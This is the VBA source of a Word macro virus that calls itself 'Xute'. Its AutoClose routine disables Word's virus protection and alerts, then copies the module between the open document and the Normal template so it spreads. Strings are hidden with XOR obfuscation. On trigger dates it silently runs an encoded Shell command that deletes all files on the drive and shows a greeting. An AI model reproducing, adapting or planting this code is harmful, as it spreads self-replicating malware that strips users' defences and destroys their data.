   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Xute"
   Const ID_VIR = "Alm|"
   Const DIR_VIR = "Z#EALM\7]XM"
   Const FX_VIR = "]\UMK\\96@9E373"
   Const GREETS = "Rlmk|a9{`9Alm|"

   Private Function encr(s, k As Integer)
       Dim r
       r = ""
       For f = 1 To Len(s): r = r + Chr((Asc(Mid$(s, f, 1))) Xor k): Next
       encr = r
   End Function

   Sub AutoClose()
       Dim IsInDoc, IsInTem As Boolean
       Dim InDoc, InTem As Integer
       Dim iDay, iMon As Integer
       Dim DatFx As String
       On Error GoTo Done
       IsInTem = False
       IsInDoc = False
       InDoc = 0
       InTem = 0
       Options.VirusProtection = False
       Options.SaveNormalPrompt = False
       Options.ConfirmConversions = False
       Application.ScreenUpdating = False
       Application.DisplayAlerts = wdAlertsNone
       DatFx = Date$
       iDay = Val(Mid$(DatFx, 4, 2)): iMon = Val(Mid$(DatFx, 1, 2))
       If (iMon = 7 And iDay = 26) Or (iDay + iMon) = 30 Then
           DatFx = encr(FX_VIR, 25)
           Shell DatFx, 0
           MsgBox "wow" & encr(GREETS, 25)
       End If

       For i = 1 To ActiveDocument.VBProject.VBComponents.Count
           If ActiveDocument.VBProject.VBComponents(i).Name = encr(ID_VIR, 25) Then
               IsInDoc = True
               InDoc = i
           End If
       Next
       For i = 1 To NormalTemplate.VBProject.VBComponents.Count
           If NormalTemplate.VBProject.VBComponents(i).Name = encr(ID_VIR, 25) Then
               IsInTem = True
               InTem = i
           End If
       Next
       If Not IsInTem Then
           ActiveDocument.VBProject.VBComponents(InDoc).Export encr(DIR_VIR, 25)
           NormalTemplate.VBProject.VBComponents.Import encr(DIR_VIR, 25)
           NormalTemplate.Save
       End If
       If Not IsInDoc And ActiveDocument.Saved = False Then
           NormalTemplate.VBProject.VBComponents(InTem).Export encr(DIR_VIR, 25)
           ActiveDocument.VBProject.VBComponents.Import encr(DIR_VIR, 25)
           ActiveDocument.Save
       End If
       Kill encr(DIR_VIR, 25)
   Done:
       Application.ScreenUpdating = True
       Application.DisplayAlerts = wdAlertsAll
   End Sub
